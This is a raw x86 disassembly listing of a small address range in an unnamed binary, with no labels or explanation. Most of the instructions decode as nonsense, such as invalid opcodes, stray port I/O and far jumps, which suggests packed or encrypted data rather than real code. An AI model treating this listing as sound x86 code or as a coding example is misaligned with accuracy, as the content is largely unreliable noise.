  40de60:	call   0xc9961752
  40de65:	jbe    0x40dea4
  40de67:	xchg   BYTE PTR [esi+0x4a82f067],ah
  40de6d:	mov    cl,0x96
  40de6f:	dec    ebx
  40de70:	pop    ecx
  40de71:	or     BYTE PTR [edi+edi*8-0x32010287],ah
  40de78:	adc    eax,0x92aa92ca
  40de7d:	mov    al,0x90
  40de7f:	call   0x56c0:0xd96d2ae7
  40de86:	jle    0x40de09
  40de88:	xor    ebp,DWORD PTR [edx-0x14e789c3]
  40de8e:	popf   
  40de8f:	fiadd  WORD PTR [esi]
  40de91:	test   al,0xa0
  40de93:	mov    gs:0xcb3823bc,al
  40de99:	ds jp  0x40dec0
  40de9c:	fnsave fs:[ebx+0x1]
  40dea0:	out    0x34,eax
  40dea2:	adc    DWORD PTR [edx],eax
  40dea4:	sbb    al,bl
  40dea6:	(bad)  
  40dea7:	push   0xffffffc6
  40dea9:	pop    es
  40deaa:	xchg   BYTE PTR [esi],cl
  40deac:	and    DWORD PTR [edx+0x17],0xa6052cc8
  40deb3:	sbb    eax,edi
  40deb5:	adc    al,0xb
  40deb7:	cmp    ecx,ecx
  40deb9:	dec    esp
  40deba:	repz rol ebp,1
  40debd:	dec    edx
  40debe:	int3   
  40debf:	ret    0xcc65
  40dec2:	xchg   ebx,eax
  40dec3:	and    edx,ebx
  40dec5:	pop    ss
  40dec6:	mov    ah,0xca
  40dec8:	js     0x40deab
  40deca:	push   eax
  40decb:	cmc    
  40decc:	iret   
  40decd:	xchg   ecx,eax
  40dece:	ret    
  40decf:	imul   edx,DWORD PTR [esi],0x2bddb628
  40ded5:	lahf   
  40ded6:	mov    fs,ecx
  40ded8:	pop    ecx
  40ded9:	pop    es
  40deda:	add    BYTE PTR [edi],dh
  40dedc:	push   edx
  40dedd:	daa    
  40dede:	jne    0x40df3f
  40dee0:	stos   BYTE PTR es:[edi],al
  40dee1:	shl    BYTE PTR [edi],1
  40dee3:	aam    0x8c
  40dee5:	stc    
  40dee6:	sbb    BYTE PTR [edx+eax*1+0xf1de820],dh
  40deed:	dec    edi
  40deee:	mov    esi,0x11285447
  40def3:	aam    0xbf
  40def5:	jb     0x40df4c
  40def7:	mov    BYTE PTR [edx],ah
  40def9:	sbb    DWORD PTR [edx+0x28a10883],edx
  40deff:	pop    ebp
  40df00:	ret    
  40df01:	sbb    eax,0x25f4c2ac
  40df06:	sub    dl,BYTE PTR [ecx-0x1ed60ca6]
  40df0c:	pop    edx
  40df0d:	dec    esp
  40df0e:	mov    ecx,0x425a826e
  40df13:	(bad)  
  40df14:	in     al,0x47
  40df16:	addr16 pop esp
  40df18:	pop    ebx
  40df19:	popa   
  40df1a:	jecxz  0x40dea7
  40df1c:	cs call 0xc64e:0xd91deb4
  40df24:	ins    BYTE PTR es:[edi],dx
  40df25:	pop    ecx
  40df26:	mov    eax,0xf4a14543
  40df2b:	bswap  ebp
  40df2d:	push   ds
  40df2e:	retf   
  40df2f:	pusha  
  40df30:	xor    BYTE PTR [ecx*1+0x1fb3c9bc],ah
  40df37:	xchg   DWORD PTR [edi-0x3e],ebx
  40df3a:	or     eax,0xcda2e7ff
  40df3f:	cmp    ebx,DWORD PTR [esi-0x3679b860]
  40df45:	add    al,0xc3
  40df47:	jecxz  0x40df6a
  40df49:	xor    edi,edi
  40df4b:	in     al,0xf5
  40df4d:	js     0x40df0e
  40df4f:	mov    ebx,0x7e9f39fb
  40df54:	retf   
  40df55:	mov    ebp,0x24734b3c
  40df5a:	mov    BYTE PTR [esi-0x42],bh
  40df5d:	pushf  
  40df5e:	add    eax,0xa2ffd68
  40df63:	mov    dl,0x41
  40df65:	hlt    
  40df66:	add    esp,ecx
  40df68:	js     0x40df93
  40df6a:	dec    ebx
  40df6b:	jmp    0xb796:0x2f35f6cb
  40df72:	cwde   
  40df73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df74:	dec    ah
  40df76:	cmp    DWORD PTR [edi],eax
  40df78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df79:	in     al,0x2
  40df7b:	jnp    0x40df16
  40df7d:	arpl   dx,dx
  40df7f:	aam    0x64
  40df81:	pop    eax
  40df82:	aas    
  40df83:	pop    eax
  40df84:	fimul  WORD PTR [edi+0x5b]
  40df87:	lock in al,0xad
  40df8a:	(bad)  
  40df8b:	cmp    BYTE PTR [eax+0x5b4b40b7],al
  40df91:	sub    eax,0xf3df6e31
  40df96:	aad    0x58
  40df98:	or     DWORD PTR [ebx+0x297e31c6],0xffffffa4
  40df9f:	or     esp,ecx
  40dfa1:	in     eax,dx
  40dfa2:	inc    edx
  40dfa3:	pop    esp
  40dfa4:	retf   0x2683
  40dfa7:	sub    eax,0xc3037cb7
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x140413a],1
  40dfde:	push   ecx
  40dfdf:	add    eax,0x78b2880f
  40dfe4:	js     0x40e01b
  40dfe6:	jle    0x40e060
  40dfe8:	js     0x40dfd9
  40dfea:	mov    al,ds:0x465345a8
  40dfef:	(bad)  
  40dff0:	fild   DWORD PTR [ebx+0x3c98928a]
  40dff6:	pop    ebp
  40dff7:	pusha  
  40dff8:	push   edx
  40dff9:	out    dx,eax
  40dffa:	mov    al,0x7a
  40dffc:	mov    ebp,0xb2859e0f
  40e001:	adc    BYTE PTR [ecx-0x33e30d53],dl
  40e007:	fist   WORD PTR [edx-0x55]
  40e00a:	adc    BYTE PTR [esi+ecx*2-0xd23a933],bl
  40e011:	inc    eax
  40e012:	sahf   
  40e013:	dec    ebp
  40e014:	js     0x40e053
  40e016:	cmc    
  40e017:	push   ds
  40e018:	sbb    DWORD PTR [ecx+edi*2],ebx
  40e01b:	adc    al,0xbb
  40e01d:	xchg   edi,eax
  40e01e:	mov    esp,DWORD PTR [ecx-0x37]
  40e021:	out    0xa0,eax
  40e023:	arpl   WORD PTR ds:0x4a7dc89c,sp
  40e029:	sub    eax,0x405bede9
  40e02e:	sbb    al,0x82
  40e030:	xor    eax,0x42362897
  40e035:	stos   BYTE PTR es:[edi],al
  40e036:	(bad)
  40e03a:	loope  0x40e059
  40e03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e03d:	cmp    al,0xfa
  40e03f:	bound  edx,QWORD PTR [ecx+0x1c8ccc42]
  40e045:	cmp    al,0x80
  40e047:	push   ds
  40e048:	pop    esp
  40e049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e04a:	adc    edx,DWORD PTR [edx+0x2525937c]
  40e050:	mov    ch,BYTE PTR [ebp-0x35b27829]
  40e056:	cs fldl2e 
  40e059:	adc    eax,0xdbbcc0d0
  40e05e:	sub    ebx,DWORD PTR [esi-0x490a6d7b]
  40e064:	cmp    dh,BYTE PTR [ecx+0x1d473e0f]
  40e06a:	pop    esp
  40e06b:	mov    cl,0x8b
  40e06d:	jge    0x40e009
  40e06f:	fstp   QWORD PTR [edi+0x2]
  40e072:	and    BYTE PTR [eax+0x6d388c1b],cl
  40e078:	xor    al,0x77
  40e07a:	mov    ebx,0xfa6d907f
  40e07f:	jge    0x40e0ce
  40e081:	fidivr DWORD PTR [eax-0x80]
  40e084:	and    edx,DWORD PTR [esi-0x74]
  40e087:	shl    DWORD PTR ds:0xa9b4f6e3,1
  40e08d:	into   
  40e08e:	lds    edi,FWORD PTR [eax-0x70]
  40e091:	xchg   ebp,eax
  40e092:	out    dx,al
  40e093:	and    esp,ebp
  40e095:	repnz outs dx,DWORD PTR ds:[esi]
  40e097:	imul   esi,DWORD PTR [edi],0xd50de0b7
  40e09d:	es nop
  40e09f:	and    bh,BYTE PTR [esi]
  40e0a1:	or     eax,0x7bd2cfd4
  40e0a6:	mov    eax,DWORD PTR [ecx]
  40e0a8:	mov    al,ds:0xdc33fb2b
  40e0ad:	mov    eax,0x6c63635a
  40e0b2:	jmp    0xb116:0xd30976df
  40e0b9:	jg     0x40e10c
  40e0bb:	popa   
  40e0bc:	push   edx
  40e0bd:	lock dec ebx
  40e0bf:	inc    esp
  40e0c0:	sar    DWORD PTR [ebx],1
  40e0c2:	ja     0x40e0c0
  40e0c4:	xor    eax,0x721718f5
  40e0c9:	mov    ecx,0x39a74ffe
  40e0ce:	stc    
  40e0cf:	das    
  40e0d0:	retf   
  40e0d1:	dec    ebx
  40e0d2:	frstor [esi+0x69]
  40e0d5:	sub    esi,DWORD PTR [ecx]
  40e0d7:	dec    eax
  40e0d8:	and    eax,0x9a7cf9fe
  40e0dd:	es in  eax,dx
  40e0df:	mov    ebp,0xd41faa71
  40e0e4:	call   0xadc46168
  40e0e9:	fld    QWORD PTR [edx+0x4bf7d31f]
  40e0ef:	adc    al,0x63
  40e0f1:	xor    ch,BYTE PTR [edx+0x6425141d]
  40e0f7:	pop    es
  40e0f8:	shl    DWORD PTR [ecx+0x32],1
  40e0fb:	outs   dx,DWORD PTR ds:[esi]
  40e0fc:	in     al,dx
  40e0fd:	clc    
  40e0fe:	xor    ebp,DWORD PTR [eax-0x2e14376]
  40e104:	clc    
  40e105:	and    dh,BYTE PTR [esp+eax*1-0xc622387]
  40e10c:	mov    dh,0x72
  40e10e:	xor    bl,BYTE PTR [esi+0x70167c4e]
  40e114:	and    al,0x5a
  40e116:	pop    ss
  40e117:	fcmovb st,st(3)
  40e119:	xor    DWORD PTR [ebp-0x72],esi
  40e11c:	push   es
  40e11d:	xor    bl,BYTE PTR [edx]
  40e11f:	pop    esp
  40e120:	pop    ebx
  40e121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e122:	aam    0xa2
  40e124:	(bad)  
  40e125:	dec    ebp
  40e126:	mov    dl,BYTE PTR [ebp-0x1b3dd4f]
  40e12c:	sbb    dh,BYTE PTR [eax-0x5b4142c0]
  40e132:	dec    edi
  40e133:	adc    DWORD PTR [ecx-0x32124783],0xffffffcb
  40e13a:	mov    ds:0x3611b924,eax
  40e13f:	jge    0x40e0c2
  40e141:	inc    esp
  40e142:	jge    0x40e156
  40e144:	mov    bl,0x3c
  40e146:	ret    
  40e147:	push   eax
  40e148:	test   esp,esp
  40e14a:	gs or  ecx,edi
  40e14d:	push   esi
  40e14e:	icebp  
  40e14f:	sbb    eax,0xac97e13b
  40e154:	sub    al,bh
  40e156:	repz test eax,0xd170bfd4
  40e15c:	pop    esp
  40e15d:	xchg   DWORD PTR [edx],esi
  40e15f:	pop    esi
  40e160:	cdq    
  40e161:	dec    esi
  40e162:	(bad)  
  40e164:	aas    
  40e165:	pop    DWORD PTR [edi+0x7c157ccc]
  40e16b:	cmp    al,0x24
  40e16d:	mov    esp,0xd29d4960
  40e172:	mov    ds:0x1e15889,eax
  40e177:	cmp    al,0x53
  40e179:	adc    eax,0x25812a8e
  40e17e:	retf   
  40e17f:	int3   
  40e180:	icebp  
  40e181:	sub    ch,al
  40e183:	and    al,0xde
  40e185:	mov    edx,0x421114c
  40e18a:	adc    al,0xe3
  40e18c:	stos   BYTE PTR es:[edi],al
  40e18d:	dec    eax
  40e18e:	imul   ebx,DWORD PTR [edx+0x5c98b814],0x82b4b14e
  40e198:	aas    
  40e199:	mov    dl,0xa
  40e19b:	adc    al,cl
  40e19d:	inc    ecx
  40e19e:	cli    
  40e19f:	add    BYTE PTR [ebx],0x7b
  40e1a2:	mov    bh,0x85
  40e1a4:	xchg   esi,eax
  40e1a5:	adc    BYTE PTR [ebx+0x73],0x60
  40e1a9:	stos   DWORD PTR es:[edi],eax
  40e1aa:	mov    edx,0x2505d246
  40e1af:	rol    DWORD PTR ds:0xc402c49a,0x72
  40e1b6:	cmp    DWORD PTR [edx],edi
  40e1b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1b9:	xor    eax,0xbe1a4600
  40e1be:	pop    edi
  40e1bf:	ss pop esi
  40e1c1:	int3   
  40e1c2:	or     ebx,DWORD PTR [ebp+0x1221eba7]
  40e1c8:	mov    esi,0x5ebf836c
  40e1cd:	ror    DWORD PTR [ebx+0x65],0xc9
  40e1d1:	pop    es
  40e1d2:	jg     0x40e1c7
  40e1d4:	sbb    al,0xb0
  40e1d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1d7:	(bad)  
  40e1d8:	in     eax,dx
  40e1d9:	sti    
  40e1da:	mov    ds:0x6570aae,eax
  40e1df:	xor    al,0x93
  40e1e1:	xor    BYTE PTR [esi-0x742f532c],ah
  40e1e7:	(bad)  
  40e1e8:	fndisi(8087 only) 
  40e1ea:	mul    ebp
  40e1ec:	adc    edi,DWORD PTR [ecx]
  40e1ee:	enter  0x438a,0x9e
  40e1f2:	inc    ebp
  40e1f3:	dec    eax
  40e1f4:	pop    edx
  40e1f5:	les    ecx,FWORD PTR [eax+0x51]
  40e1f8:	mov    cl,0x3b
  40e1fa:	aam    0x49
  40e1fc:	pushf  
  40e1fd:	arpl   WORD PTR [eax],si
  40e1ff:	fsub   QWORD PTR [ebp+0x4a3dca5]
  40e205:	jb     0x40e1fd
  40e207:	and    DWORD PTR [ebx+eax*1],ebx
  40e20a:	mov    ds:0xb3f0bb44,eax
  40e20f:	gs scas eax,DWORD PTR es:[edi]
  40e211:	ror    BYTE PTR [edx+0x38],0x66
  40e215:	push   ss
  40e216:	xor    al,0xf2
  40e218:	pusha  
  40e219:	pop    esp
  40e21a:	or     dl,dl
  40e21c:	mov    ds:0x55d4574f,al
  40e221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e222:	ja     0x40e1a7
  40e224:	xor    eax,esi
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	push   esi
  40e23b:	inc    eax
  40e23c:	add    ebx,esi
  40e23e:	inc    ebp
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e218
  40e247:	cmp    edx,DWORD PTR [edx+0x331120ea]
  40e24d:	mov    al,ds:0xaebb7ef8
  40e252:	jne    0x40e282
  40e254:	jg     0x40e288
  40e256:	retf   0x1630
  40e259:	cmp    eax,0x6d21aebf
  40e25e:	xchg   ebx,eax
  40e25f:	xor    esp,DWORD PTR [esi-0xc47f042]
  40e265:	adc    eax,0x70cc765d
  40e26a:	mov    ebx,0x6fb122fd
  40e26f:	push   ebx
  40e270:	std    
  40e271:	and    al,0xd5
  40e273:	ret    
  40e274:	sbb    al,0x4d
  40e276:	test   BYTE PTR [edx-0x17],0xaa
  40e27a:	sbb    eax,0x45a4dd9d
  40e27f:	xchg   esi,eax
  40e280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e281:	mov    esi,0x669a05c9
  40e286:	sbb    DWORD PTR [edi],eax
  40e288:	retf   
  40e289:	or     eax,0x7ba94197
  40e28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e28f:	(bad)  
  40e290:	lea    esp,[ebp+0x79]
  40e293:	adc    BYTE PTR [edi+0x4981f9aa],0x98
  40e29a:	pop    es
  40e29b:	lea    ebx,[ecx-0x2d]
  40e29e:	adc    BYTE PTR [ecx],dh
  40e2a0:	(bad)  
  40e2a1:	fstp   TBYTE PTR [edi-0x3]
  40e2a4:	repz inc ebx
  40e2a6:	cld    
  40e2a7:	icebp  
  40e2a8:	or     ebx,DWORD PTR [esi+0x1b501276]
  40e2ae:	jecxz  0x40e29d
  40e2b0:	sar    bl,1
  40e2b2:	popf   
  40e2b3:	cmp    bl,ah
  40e2b5:	gs iret 
  40e2b7:	mov    esp,0x2f92df51
  40e2bc:	(bad)  
  40e2bd:	ss div dh
  40e2c0:	hlt    
  40e2c1:	xchg   DWORD PTR [edi],ebx
  40e2c3:	imul   edx,DWORD PTR [ecx+0x6e],0xff3229e1
  40e2ca:	outs   dx,BYTE PTR ds:[esi]
  40e2cb:	sub    eax,0xce95cce2
  40e2d0:	push   eax
  40e2d1:	(bad)  [edx]
  40e2d3:	inc    edx
  40e2d4:	mov    dl,0x25
  40e2d6:	lods   eax,DWORD PTR ds:[esi]
  40e2d7:	dec    esi
  40e2d8:	lods   eax,DWORD PTR ds:[esi]
  40e2d9:	stos   BYTE PTR es:[edi],al
  40e2da:	in     al,dx
  40e2db:	inc    esp
  40e2dc:	hlt    
  40e2dd:	jns    0x40e2fa
  40e2df:	sbb    eax,0x63432cea
  40e2e4:	scas   eax,DWORD PTR es:[edi]
  40e2e5:	and    esi,esi
  40e2e7:	lods   eax,DWORD PTR ds:[esi]
  40e2e8:	fld    DWORD PTR [ebx-0x7ee819f1]
  40e2ee:	pusha  
  40e2ef:	sbb    BYTE PTR [ecx],bl
  40e2f1:	outs   dx,BYTE PTR ds:[esi]
  40e2f2:	jno    0x40e290
  40e2f4:	dec    edx
  40e2f5:	push   esp
  40e2f6:	mov    cl,0xc4
  40e2f8:	addr16 jmp 0xc69851c3
  40e2fe:	push   ecx
  40e2ff:	ja     0x40e33d
  40e301:	retf   
  40e302:	adc    eax,0x72101db
  40e307:	sub    BYTE PTR [esi-0x68de8729],ch
  40e30d:	xor    al,0x70
  40e30f:	adc    DWORD PTR [edx-0x34b5bc93],ebp
  40e315:	jb     0x40e2e1
  40e317:	cmp    ecx,esp
  40e319:	push   ebp
  40e31a:	test   ebx,0xcd3cdef0
  40e320:	cmc    
  40e321:	scas   eax,DWORD PTR es:[edi]
  40e322:	add    ecx,edi
  40e324:	adc    ebp,ecx
  40e326:	sub    eax,0x89970052
  40e32b:	mov    dh,0xb8
  40e32d:	inc    esi
  40e32e:	or     BYTE PTR [eax+0x4fc8ed6b],ah
  40e334:	loopne 0x40e2cb
  40e336:	pop    eax
  40e337:	imul   ebx,DWORD PTR [edx],0x40371f3c
  40e33d:	shr    dl,0x54
  40e340:	mov    ah,0x3f
  40e342:	inc    bh
  40e344:	mov    eax,ds:0xe5d1d428
  40e349:	inc    esi
  40e34a:	js     0x40e367
  40e34c:	paddsw mm2,QWORD PTR [ebp-0x50]
  40e350:	out    dx,eax
  40e351:	cdq    
  40e352:	psrad  mm0,mm5
  40e355:	ja     0x40e30d
  40e357:	and    DWORD PTR [esi-0x47fe9e9f],ebp
  40e35d:	int    0xe6
  40e35f:	or     BYTE PTR [ebp-0x65],al
  40e362:	push   ds
  40e363:	ja     0x40e2fb
  40e365:	xor    BYTE PTR [esi],ch
  40e367:	and    ch,BYTE PTR [esi+0x7158185f]
  40e36d:	xchg   edi,eax
  40e36e:	in     al,dx
  40e36f:	nop
  40e370:	xor    esi,0xd4f293c8
  40e376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e377:	shl    BYTE PTR [edi],cl
  40e379:	push   ebp
  40e37a:	mov    edi,0x42e5e185
  40e37f:	sbb    ch,bl
  40e381:	dec    eax
  40e382:	pop    esi
  40e383:	adc    dl,bl
  40e385:	hlt    
  40e386:	xchg   esp,eax
  40e387:	call   0x5a49:0x3ea00a08
  40e38e:	int3   
  40e38f:	and    BYTE PTR [esi+edx*4+0x63a3070b],bl
  40e396:	mov    WORD PTR [ebp-0x4],?
  40e399:	and    esi,DWORD PTR [ebx-0x2fd5f652]
  40e39f:	jge    0x40e3b1
  40e3a1:	mul    BYTE PTR [ebp+eax*2+0x69]
  40e3a5:	(bad)  
  40e3a6:	push   edx
  40e3a7:	pushf  
  40e3a8:	add    BYTE PTR [ebp-0x1c9fc61c],ah
  40e3ae:	push   esp
  40e3af:	or     eax,0x79ba62fe
  40e3b4:	sbb    BYTE PTR [edx-0xee13efd],0x12
  40e3bb:	stos   BYTE PTR es:[edi],al
  40e3bc:	repnz mov ds:0x796e0909,eax
  40e3c2:	lahf   
  40e3c3:	and    BYTE PTR [ebx+0x4b],bl
  40e3c6:	in     eax,0x98
  40e3c8:	jne    0x40e404
  40e3ca:	daa    
  40e3cb:	mov    ah,0x70
  40e3cd:	sbb    al,BYTE PTR [eax+0x26]
  40e3d0:	(bad)  
  40e3d1:	leave  
  40e3d2:	scas   eax,DWORD PTR es:[edi]
  40e3d3:	pop    ds
  40e3d4:	pop    edx
  40e3d5:	cmp    BYTE PTR [eax+ecx*8+0x2e],cl
  40e3d9:	mov    al,ds:0xa300ad30
  40e3de:	dec    eax
  40e3df:	sub    al,0x20
  40e3e1:	xchg   ebx,eax
  40e3e2:	adc    al,0xda
  40e3e4:	xor    DWORD PTR [esi-0x75],ecx
  40e3e7:	out    dx,eax
  40e3e8:	inc    eax
  40e3e9:	popa   
  40e3ea:	adc    BYTE PTR [ebx-0x57df0e68],ah
  40e3f0:	mov    ds:0x45af070c,al
  40e3f5:	sbb    eax,0xb465cfbd
  40e3fa:	mov    dh,0xc0
  40e3fc:	sbb    al,0x86
  40e3fe:	mov    al,0xea
  40e400:	in     al,0xa
  40e402:	xchg   ecx,eax
  40e403:	inc    edx
  40e404:	fistp  DWORD PTR [ebx-0x5801be57]
  40e40a:	(bad)  
  40e40b:	icebp  
  40e40c:	js     0x40e3e8
  40e40e:	dec    eax
  40e40f:	push   0x8edf1f18
  40e414:	xchg   edi,eax
  40e415:	test   al,0x3
  40e417:	jo     0x40e44b
  40e419:	(bad)  
  40e41a:	dec    esi
  40e41b:	(bad)  
  40e41d:	int3   
  40e41e:	inc    esp
  40e41f:	loopne 0x40e499
  40e421:	mov    BYTE PTR [edi+0x29],bh
  40e424:	mov    ds:0x424ec115,eax
  40e429:	xor    cl,BYTE PTR [esi]
  40e42b:	lds    edx,FWORD PTR [esi-0x2a6f5ace]
  40e431:	retf   
  40e432:	out    0xd0,al
  40e434:	outs   dx,DWORD PTR ds:[esi]
  40e435:	mov    edx,0x87118682
  40e43a:	cld    
  40e43b:	pushf  
  40e43c:	cmp    esi,DWORD PTR [esi-0x17]
  40e43f:	not    DWORD PTR [edi]
  40e441:	es ss sti 
  40e444:	sbb    eax,0x6f4b091c
  40e449:	mov    esp,0xb5e0bf6e
  40e44e:	pop    edx
  40e44f:	sbb    eax,0xe98ccbe
  40e454:	inc    esi
  40e455:	fldenv [esp+edx*1]
  40e458:	inc    esp
  40e459:	in     eax,dx
  40e45a:	lea    edi,[ecx+0x2caaf5a]
  40e460:	push   ebp
  40e461:	or     eax,0x73ca4105
  40e466:	retf   
  40e467:	xchg   ecx,eax
  40e468:	adc    eax,0x80b05a58
  40e46d:	jae    0x40e451
  40e46f:	out    dx,al
  40e470:	push   ebx
  40e471:	or     al,0x3b
  40e473:	rol    BYTE PTR [esi],1
  40e475:	test   DWORD PTR [esi+0x25666a14],0x4a88aab6
  40e47f:	inc    esp
  40e480:	mov    BYTE PTR [ecx+0x41eb06],ah
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ebx,DWORD PTR [edi-0x46]
  40e4b9:	pop    eax
  40e4ba:	pop    ecx
  40e4bb:	add    dh,BYTE PTR [ebp+0x7e357878]
  40e4c1:	js     0x40e53b
  40e4c3:	loopne 0x40e4b0
  40e4c5:	dec    edx
  40e4c6:	icebp  
  40e4c7:	mov    edx,0x47c3f0b4
  40e4cc:	mov    esi,0xbb7aaea2
  40e4d1:	jo     0x40e482
  40e4d3:	xor    eax,0x83def657
  40e4d8:	call   0x1ef:0x3acf4b23
  40e4df:	mov    edx,0x5812e589
  40e4e4:	loope  0x40e499
  40e4e6:	inc    dh
  40e4e8:	xor    eax,0x4a3d6085
  40e4ed:	xor    cl,BYTE PTR [ebx+0x5e]
  40e4f0:	xor    DWORD PTR [ebx+eiz*2-0x20c53b13],edx
  40e4f7:	test   al,0x4a
  40e4f9:	sbb    al,0x36
  40e4fb:	jmp    0x5e0ed910
  40e500:	imul   edx,DWORD PTR [edi+eax*8],0xffffffc0
  40e504:	mov    bh,0xc9
  40e506:	sbb    esi,DWORD PTR [esi]
  40e508:	sub    DWORD PTR [esp+edx*2+0x20fdfb73],0x61
  40e510:	mov    ds:0x764ea042,eax
  40e515:	cmp    eax,DWORD PTR [edx]
  40e517:	dec    eax
  40e518:	jo     0x40e4fa
  40e51a:	rol    BYTE PTR [edx-0x11],1
  40e51d:	fldenv [esi]
  40e51f:	jge    0x40e532
  40e521:	das    
  40e522:	sbb    al,0x86
  40e524:	lods   eax,DWORD PTR ds:[esi]
  40e525:	sub    bl,BYTE PTR [eax+0xc]
  40e528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e529:	dec    edx
  40e52a:	cdq    
  40e52b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40e52d:	jmp    0x40e577
  40e52f:	xor    cl,BYTE PTR [ebx-0x75]
  40e532:	jge    0x40e583
  40e534:	in     al,dx
  40e535:	sti    
  40e536:	cmc    
  40e537:	push   ecx
  40e538:	push   ss
  40e539:	inc    esi
  40e53a:	inc    edx
  40e53b:	inc    esi
  40e53c:	sbb    ebp,DWORD PTR [edi]
  40e53e:	sub    al,0xa4
  40e540:	adc    DWORD PTR ds:0x4dddab04,eax
  40e546:	mov    BYTE PTR [ebx],0x43
  40e549:	lea    di,[ecx+0x37]
  40e54d:	outs   dx,DWORD PTR ds:[esi]
  40e54e:	(bad)  
  40e54f:	in     eax,dx
  40e550:	pop    ss
  40e551:	dec    ebx
  40e552:	test   al,0xf8
  40e554:	mov    ecx,0x93328d49
  40e559:	push   edi
  40e55a:	xor    eax,0x764cd66f
  40e55f:	leave  
  40e560:	ins    BYTE PTR es:[edi],dx
  40e561:	inc    esi
  40e562:	pop    ss
  40e563:	sti    
  40e564:	ja     0x40e5e5
  40e566:	les    esp,FWORD PTR [ebx+0x49]
  40e569:	or     al,0x51
  40e56b:	push   es
  40e56c:	mov    ch,0x64
  40e56e:	inc    eax
  40e56f:	mov    eax,ds:0xe3d20112
  40e574:	mov    esp,0xb5eba7c5
  40e579:	clc    
  40e57a:	push   ebp
  40e57b:	mul    DWORD PTR [ebx-0x1c]
  40e57e:	stc    
  40e57f:	inc    edx
  40e580:	scas   al,BYTE PTR es:[edi]
  40e581:	jge    0x40e5fb
  40e583:	inc    edx
  40e584:	sahf   
  40e585:	das    
  40e586:	es leave 
  40e588:	jmp    0xa437:0xb0610050
  40e58f:	push   cs
  40e590:	add    eax,esp
  40e592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e593:	jg     0x40e5c6
  40e595:	inc    ecx
  40e596:	adc    eax,0x683b11a8
  40e59b:	lock mov esi,0x18fc8244
  40e5a1:	popf   
  40e5a2:	dec    ebx
  40e5a3:	xor    esp,edi
  40e5a5:	dec    edi
  40e5a6:	cmp    al,0xd2
  40e5a8:	jmp    0x91df0bd0
  40e5ad:	add    al,0xd
  40e5af:	inc    edx
  40e5b0:	fwait
  40e5b1:	in     eax,dx
  40e5b2:	inc    edx
  40e5b3:	nop
  40e5b4:	and    DWORD PTR [esi-0x34a65c96],esi
  40e5ba:	jbe    0x40e619
  40e5bc:	in     ax,dx
  40e5be:	fs js  0x40e5ad
  40e5c1:	into   
  40e5c2:	cld    
  40e5c3:	xchg   ecx,eax
  40e5c4:	xor    al,0xfa
  40e5c6:	mov    ah,0x0
  40e5c8:	mov    edi,0x1952ae14
  40e5cd:	dec    ebp
  40e5ce:	jae    0x40e5f2
  40e5d0:	std    
  40e5d1:	mov    bl,0x7c
  40e5d3:	dec    ecx
  40e5d4:	ins    BYTE PTR es:[edi],dx
  40e5d5:	stos   BYTE PTR es:[edi],al
  40e5d6:	aaa    
  40e5d7:	push   edx
  40e5d8:	in     al,dx
  40e5d9:	mov    cl,0x81
  40e5db:	imul   ebp,DWORD PTR [esi+0x592597df],0x4c012045
  40e5e5:	in     eax,0x74
  40e5e7:	mov    al,0x2d
  40e5e9:	stos   BYTE PTR es:[edi],al
  40e5ea:	jnp    0x40e5fa
  40e5ec:	ins    DWORD PTR es:[edi],dx
  40e5ed:	mov    dl,0x7
  40e5ef:	lods   eax,DWORD PTR ds:[esi]
  40e5f0:	pop    ebx
  40e5f1:	sbb    al,BYTE PTR [ebx+0x41fc6407]
  40e5f7:	aaa    
  40e5f8:	dec    edi
  40e5f9:	popf   
  40e5fa:	arpl   WORD PTR [edi+0x35],ax
  40e5fd:	arpl   di,bp
  40e5ff:	out    0x1a,eax
  40e601:	or     eax,0xe0824c3c
  40e606:	mul    BYTE PTR [ecx-0x513c6e6a]
  40e60c:	call   0x903:0xb2c83c95
  40e613:	(bad)  
  40e614:	lods   al,BYTE PTR ds:[esi]
  40e615:	retf   0x70f2
  40e618:	ror    DWORD PTR [esi-0x45],1
  40e61b:	mov    BYTE PTR ds:0xc5255d27,ah
  40e621:	jge    0x40e65b
